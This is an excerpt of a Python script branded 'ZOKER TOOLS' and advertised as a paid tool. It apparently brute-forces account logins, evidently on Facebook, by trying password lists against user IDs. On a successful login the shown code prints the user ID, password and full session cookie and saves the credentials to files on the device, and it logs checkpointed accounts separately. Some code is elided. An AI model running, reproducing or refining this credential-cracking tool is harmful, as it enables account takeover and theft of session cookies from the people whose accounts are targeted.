...
for xd in range(10000):
    ...
    ugen.append(uaku2)
logo = ("""
8888888888P  .d88888b.  888    d8P  8888888888 8888888b.       
      d88P  d88P" "Y88b 888   d8P   888        888   Y88b      
     d88P   888     888 888  d8P    888        888    888      
    d88P    888     888 888d88K     8888888    888   d88P      
   d88P     888     888 8888888b    888        8888888P"       
  d88P      888     888 888  Y88b   888        888 T88b        
 d88P       Y88b. .d88P 888   Y88b  888        888  T88b       
d8888888888  "Y88888P"  888    Y88b 8888888888 888   T88b      
                                                               
                                                               
                                                               

\033[1;91m\033[1;41m\033[1;97m              WELCOME TO ZOKER TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m AHMED ADIB 
\033[1;32m[-] GITHUB    :\033[1;32m ADIB-CYBER-143
\033[1;32m[-] FACEBOOK  :\033[1;32m AHMED ADIB
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS ADIB BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mZOKER\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[ZOKER-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/ZOKER/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ZOKER-CP❌] {uid}|{ps}")
                open('/sdcard/ZOKER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ZOKER-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
